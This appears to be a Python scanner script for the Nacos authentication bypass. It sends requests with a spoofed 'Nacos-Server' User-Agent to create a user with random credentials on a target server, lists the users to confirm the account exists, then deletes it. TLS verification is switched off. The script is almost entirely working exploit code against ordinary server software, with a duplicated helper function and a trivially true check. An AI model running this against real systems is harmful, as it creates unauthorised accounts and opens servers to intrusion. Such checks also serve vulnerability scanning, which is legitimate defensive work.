import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r11=randomLowercase(16)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r22=randomLowercase(16)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"nacos/v1/auth/users/?username="+r11+"&password="+r22+""
	headers={'User-Agent': 'Nacos-Server'}
	body=''
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "create user ok!" in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"nacos/v1/auth/users/?pageNo=1&pageSize=999"
	headers={'User-Agent': 'Nacos-Server'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and r11 in response.text:
		r1=True
	else:
		r1=False
	url=baseurl+'nacos/v1/auth/users/?username='+r11
	headers={'User-Agent': 'Nacos-Server'}
	r=requests.delete(url,headers=headers,timeout=5,verify=False)
	if True:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
